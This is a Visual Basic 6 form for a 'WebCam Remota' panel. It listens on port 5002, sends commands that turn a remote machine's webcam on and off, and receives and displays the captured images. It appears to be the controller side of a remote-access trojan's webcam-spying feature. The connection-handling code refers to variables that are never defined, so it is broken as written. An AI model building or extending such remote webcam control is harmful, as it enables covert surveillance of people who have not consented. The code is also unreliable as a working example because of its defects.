VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{DA729E34-689F-49EA-A856-B57046630B73}#1.0#0"; "Progressbar-xp.ocx"
Begin VB.Form Form8 
   Caption         =   "WebCan Remota"
   ClientHeight    =   8550
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   9855
   LinkTopic       =   "Form8"
   ScaleHeight     =   8550
   ScaleWidth      =   9855
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command3 
      Caption         =   "Ricevi Immagine"
      Height          =   255
      Left            =   2520
      TabIndex        =   4
      Top             =   8160
      Width           =   1695
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Ricevimento Continuo"
      Height          =   375
      Left            =   4560
      TabIndex        =   3
      Top             =   8040
      Width           =   2175
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Disattiva WebCam"
      Height          =   255
      Left            =   4800
      TabIndex        =   2
      Top             =   7800
      Width           =   1575
   End
   Begin MSWinsockLib.Winsock WinsockWebCam 
      Index           =   0
      Left            =   4320
      Top             =   8760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Attiva WebCam"
      Height          =   255
      Left            =   2520
      TabIndex        =   1
      Top             =   7800
      Width           =   1695
   End
   Begin Proyecto2.XP_ProgressBar ProgressBar1 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   7320
      Width           =   9615
      _ExtentX        =   16960
      _ExtentY        =   661
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BrushStyle      =   0
      Color           =   255
      Scrolling       =   9
   End
   Begin VB.Line Line1 
      X1              =   0
      X2              =   9840
      Y1              =   7200
      Y2              =   7200
   End
   Begin VB.Image Image1 
      Height          =   6975
      Left            =   120
      Top             =   120
      Width           =   9615
   End
End
Attribute VB_Name = "Form8"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim vIndex As Long
Dim Archivo As Boolean, File As String, FileTotal As Long, Screen As Boolean
Dim Resolucion As Byte
Dim RIP As String

Private Sub Check1_Click()
If Check1.Value = 1 Then
Command3.Enabled = False
Else
Command3.Enabled = True
End If

End Sub

Private Sub Command1_Click()
WinsockWebCam(vIndex).SendData "webcam"

End Sub

Private Sub Command2_Click()
WinsockWebCam(vIndex).SendData "webcamoff"

End Sub

Private Sub Command3_Click()
WinsockWebCam(vIndex).SendData "webcamrecive"

End Sub

Private Sub Form_Load()
WinsockWebCam(Index).Close
WinsockWebCam(Index).LocalPort = 5002
WinsockWebCam(Index).Listen
End Sub

Private Sub WinsockWebCam_Close(Index As Integer)
WinsockWebCam(Index).Close

End Sub

Private Sub WinsockWebCam_ConnectionRequest(Index As Integer, ByVal requestID As Long)
Me.Caption = "WebCam Remota Connessa A: " & WinsockWebCam(Index).RemoteHostIP
Dim NumSock As Integer
If WinsockWebCam(i).State <> 7 Then
NumSock = i
WinsockWebCam(NumSock).Close
WinsockWebCam(NumSock).Accept requestID
Exit Sub
End If
Load WinsockWebCam(NumElem + 1)
NumSock = WS.UBound

End Sub

Private Sub WinsockWebCam_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim Datos As String
Dim vDatos() As String
WinsockWebCam(Index).GetData Datos

If Archivo = True Then
File = File & Datos
If Screen = True Then
ProgressBar1.Max = FileTotal
ProgressBar1.Min = 0
ProgressBar1.Value = Len(File)
End If
If Len(File) = FileTotal Then
Open "C:\webcam.jpg" For Binary As #1
Put #1, 1, File
Close #1
Image1.Picture = LoadPicture("c:\webcam.jpg")
Archivo = False
Screen = False
ProgressBar1.Value = 0
Kill "c:\webcam.jpg"
File = ""
If Check1.Value = 1 Then
WinsockWebCam(vIndex).SendData "webcamrecive"
End If
Exit Sub
End If
End If

vDatos = Split(Datos, "|")

Select Case vDatos(0)
Case "Conexion"

RIP = WinsockWebCam(Index).RemoteHostIP

Case "Screen"
FileTotal = vDatos(1)
Archivo = True
Screen = True
WinsockWebCam(vIndex).SendData "OK"
End Select
End Sub

